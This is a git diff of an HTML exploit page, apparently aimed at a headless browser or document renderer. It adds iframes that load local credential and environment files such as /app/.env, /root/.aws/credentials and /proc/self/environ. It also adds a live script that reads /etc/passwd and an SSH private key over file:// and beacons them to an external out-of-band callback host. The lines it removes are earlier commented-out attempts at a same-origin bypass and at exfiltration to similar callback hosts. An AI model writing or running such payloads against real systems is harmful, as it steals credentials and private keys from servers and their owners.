@@ -7,80 +7,25 @@
 <iframe src="file:///app/.env" width="1000" height="1000"></iframe>
 <iframe src="file:///root/.aws/credentials" width="1000" height="1000"></iframe>
 <iframe src="file:///proc/self/environ" width="1000" height="1000"></iframe>
+   <!-- Browsers auto-generan listing para directorios -->
+<iframe src="file:///app/" width="1000" height="1000"></iframe>
+<iframe src="file:///root/" width="1000" height="1000"></iframe>
+
 
   <script>
-    // 1. إنشاء إطار
-/*const iframe = document.createElement('iframe');
-
-// 2. توجيه الإطار للهدف
-iframe.src = 'http://127.0.0.1:8080';
-document.body.appendChild(iframe);
-
-iframe.onload = () => {
-  try {
-    // في الوضع الطبيعي سيعطي Cross-Origin Error
-    // في الثغرة، يتم الوصول للـ contentDocument بسبب الخلل في Headless Delegate
-    const secretData = iframe.contentDocument.body.innerText;
-    
-    // إرسال البيانات للخارج
-    navigator.sendBeacon('https://d9svklamruols3gjkiq03x9sijp3ahc44.oast.live/', secretData);
-  } catch (e) {
-    console.log("SOP active:", e);
-  }
-};
-    /*const totalWidth = screen.width;
-    const totalHeight = screen.height;
-    window.open(`https://d9svbl2mruoiatchkgsgzg33k5k5fi8wa.oast.me/?q=(W=${totalWidth},H=${totalHeight})`);
-    window.open("https://ahmed-talaat-a1.github.io/Testing");  
-    
-
-  
- /* async function getData() {
-    const url = "https://1.1.1.1";
-    const oast = "https://d9stcb2mruohpdmpjia0foc4nep6tzahw.oast.online/";
-
+async function leak() {
+  const files = ["/etc/passwd", "/app/.env", "/root/.ssh/id_rsa"];
+  const data = {};
+  for (const f of files) {
     try {
-        const response = await fetch(url);
-        const result = await response.text();
-
-        const data = {
-            type: "success",
-            status: response.status,
-            body: result
-        };
-
-        document.getElementById("result").textContent =
-            JSON.stringify(data, null, 2);
-
-        await fetch(oast, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        });
-
-    } catch (error) {
-        const data = {
-            type: "error",
-            name: error?.name || "UnknownError",
-            message: error?.message || String(error)
-        };
-
-        document.getElementById("result").textContent =
-            JSON.stringify(data, null, 2);
-
-        await fetch(oast, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(data)
-        });
-    }
+      data[f] = await fetch(`file://${f}`).then(r => r.text());
+    } catch (e) {}
+  }
+  navigator.sendBeacon("https://d9svklamruols3gjkiq03x9sijp3ahc44.oast.live/", JSON.stringify(data));
 }
+leak();
 
-getData();*/
+
 
 
   </script>
